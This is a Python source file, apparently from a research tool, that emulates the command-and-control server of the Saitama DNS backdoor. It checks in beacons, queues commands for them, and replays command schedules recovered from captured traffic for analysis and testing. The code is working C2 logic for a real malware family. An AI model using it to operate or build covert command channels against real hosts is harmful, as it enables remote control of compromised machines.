import logging
import math
import random
import socket

from saitama.beacon import SaitamaBeacon
from saitama.utils.colors import Colors
from saitama.utils.communication import BeaconResult, DnsPair, ResultCodes
from saitama.utils.encodings import BASE32_ALPHABET_OF_SAMPLE, decode_str_into_int

# From sample
FIRSTALIVEKEY = "haruto"

# First command will prepend an 'a'
LENGTH_OF_FIRST_KEY = len(FIRSTALIVEKEY) + 1

logger = logging.getLogger("dns_c2")


class SaitamaServer:
    def __init__(self, c2_domains: list):
        self.c2_domains = c2_domains
        self.beacons = []
        self.commands_upon_checkin = []

    def log(self, message: str, loglevel=logging.INFO) -> None:
        logger.log(level=loglevel, msg=f"{Colors.LIGHTYELLOW}[Saitama] {Colors.RESET}{message}")

    def add_beacon(self, beacon: SaitamaBeacon):
        self.log(f"Beacon check-in (ID {Colors.CYAN}{beacon.id}{Colors.RESET})")
        self.beacons.append(beacon)
        for command in self.commands_upon_checkin:
            self.schedule_task(beacon.id, command)

    def handle_command_result(self, beacon, data):
        self.log(f"{Colors.CYAN}[Beacon {beacon.id}]{Colors.RESET} : {Colors.LIGHTBLUE}{data}{Colors.RESET}")

    def schedule_task_for_new_beacons(self, command: str):
        self.commands_upon_checkin.append(command)

    def schedule_task(self, beacon_id: str, command: str) -> bool:
        beacon = next((b for b in self.beacons if b.id == beacon_id), None)
        if beacon is not None:
            beacon.command_queue.append(command)
            self.log(
                f"Tasked beacon {Colors.CYAN}{beacon_id}{Colors.RESET} with command "
                f"{Colors.RED}{command!r}{Colors.RESET}",
            )
            return True

        self.log(f"Could not schedule task for beacon {beacon_id}: not found.", logging.WARNING)
        return False

    def parse_dns_request(self, qname: str) -> str:
        data = qname.split(".")[0]
        response = False
        responding_beacon = None
        for beacon in self.beacons:
            response = beacon.process_request(data)
            if response is not False:
                responding_beacon = beacon
                break

        if response is False:
            # This can break the code, assumption that its always a firstalive when all else
            # fails, is an incorrect assumption. However, if you're using this script for testing purposes, you rather
            # want it to break than for it to behave weirdly without knowing why.
            ip_address = self.parse_firstalive_request(data)
        else:
            ip_address = response.ip_address
            result = response.beacon_result
            if result is not None:
                self.handle_beacon_result(responding_beacon, result)
        return ip_address

    def parse_firstalive_request(self, qname) -> str:

        # Parse the int 'counter' out of the dns query
        counter = decode_str_into_int(qname[LENGTH_OF_FIRST_KEY:], BASE32_ALPHABET_OF_SAMPLE)
        if counter is None:
            raise ValueError(
                (
                    "Could not decode firstalive request. Are you certain this beacon is coming up for the first time? "
                    "This script does not support a beacon resuming a previous state. Be sure to delete the 'cnf' file "
                    "in between runs.",
                )
            )
        self.log(f"Beacon counter: {counter}", loglevel=logging.DEBUG)

        # The client requires an ID, this implementation counts upwards from 240
        # Due to how the _IntToStr function works for the implant, there is a small chance that when the implant sends
        # command output, the first two characters of the DNS query are the same. This is for example true for beacon ID
        # 1. To prevent defenders accidentally fingerprinting this server-side implementation rather than how the
        # implant actually works, we start the beacon ID at 80 to prevent this small chance event from being
        # fingerprinted.
        beacon_id = len(self.beacons) + 80

        beacon = SaitamaBeacon(beacon_id, counter)
        self.add_beacon(beacon)

        # We know that the beacon will increase their counter with one, so we have to do the same
        beacon.update_counter()

        # ASSUMPTION: First three octets can be anything. This approach was chosen for some randomness
        # However, fingerprinting on the fact all 3 octets always start with 1 is nonsense, as this
        # is an arbitrary implementation, and not Saitama related.
        response = ""
        for _ in range(3):
            response += f"1{random.randrange(10, 99)}."
        response += str(beacon_id)

        return response

    def handle_beacon_result(self, beacon, result: BeaconResult) -> None:
        code = result.result_code
        data = result.result_data
        if code == ResultCodes.COMMAND_OUTPUT:
            self.handle_command_result(beacon, data)

    def parse_dns_request_and_answer(self, qname: str, response: str) -> None:
        self.parse_dns_request(qname)

    def prepare_for_replay(self, dns_pairs: list[DnsPair]) -> None:
        unique_pairs = []
        for new_pair in dns_pairs:
            exists_already = False
            for existing_pair in unique_pairs:
                if existing_pair.rdata == new_pair.rdata:
                    exists_already = True
            if not exists_already:
                unique_pairs.append(new_pair)

        # Figure out the command schedule from the pcap

        # ASSUMPTION: This script replays Saitama traffic based on assumptions on how the C2 server is built.
        # However, the C2 server can be built in a variety of ways. Thus, if your traffic / logs do not match with
        # the assumptions used here, changes to this piece of code are necessary

        # The assumption that can most often be held is that the command size will be less than 255 bytes.
        # Using this feat, we can find the packet specifying the size of the command, and use that to parse the
        # sent commands out of the PCAP so we can prepare our fake command schedule.
        self.log("Parsing sent commands out of replay input...")
        assumption_command_size_announcement_contains = ".0.0."
        for index, pair in enumerate(unique_pairs):
            if pair.rdata is None:
                continue
            if assumption_command_size_announcement_contains in pair.rdata:
                # Grab the last three octets and convert them to ints
                command_size = int.from_bytes(socket.inet_aton(pair.rdata)[1:], "big")
                number_of_packets_needed = math.ceil(command_size / 4)

                # Now we know how many pairs following this will be sending the command
                pairs_containing_command = unique_pairs[index + 1 : index + 1 + number_of_packets_needed]
                command_to_send = b""
                for command_pair in pairs_containing_command:
                    chars = command_pair.rdata.split(".")
                    for char in chars:
                        if len(command_to_send) < command_size:
                            command_to_send += int(char).to_bytes(1, "little")

                # In the replay, the first octet specifying the command is actually specifying the command type.
                # As this script only supports the 'cmd' command type, we can just pop that off.
                command_to_send = command_to_send[1:]

                # Convert to string
                command_to_send = command_to_send.decode("utf-8")
                self.log(f"Parsed command: {command_to_send}", logging.DEBUG)
                self.schedule_task_for_new_beacons(command_to_send)
